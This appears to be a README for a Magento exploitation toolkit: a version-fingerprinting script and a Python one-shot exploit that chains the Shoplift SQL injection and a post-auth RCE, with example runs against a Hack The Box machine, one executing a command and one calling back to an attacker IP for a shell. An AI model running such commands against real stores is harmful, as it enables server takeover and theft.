# get-version.sh

Determines version of Magento by comparing hash of target's `styles.css` with each tagged release's `styles.css`.

# magento-oneshot.py

## Tested on:
    Magento 1.9.0.0
    Linux 4.4.0-146-generic #172-Ubuntu SMP 2019 x86_64 GNU/Linux
    Python 3.7.4
    requests 2.20.0
    lxml 4.3.3
   
## Example run on HTB's Swagshop:

`python3 magento-oneshot.py http://10.10.10.140/index.php --history-length 1y --command id`
`python3 magento-oneshot.py http://10.10.10.140/index.php --history-length 1y --callback 10.10.14.19:12345`

## Credits:

This script uses logic from the two exploits below for a more seamless Magento exploitation experience.

### Magento Shoplift exploit (SUPEE-5344)
    https://www.exploit-db.com/exploits/37977
    Author        : Manish Kishan Tanwar AKA error1046
    Date          : 25/08/2015
    Debugged At  : Indishell Lab(originally developed by joren)

### Magento CE < 1.9.0.1 Post Auth RCE
    https://www.exploit-db.com/exploits/37811
    Date: 08/18/2015
    Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com
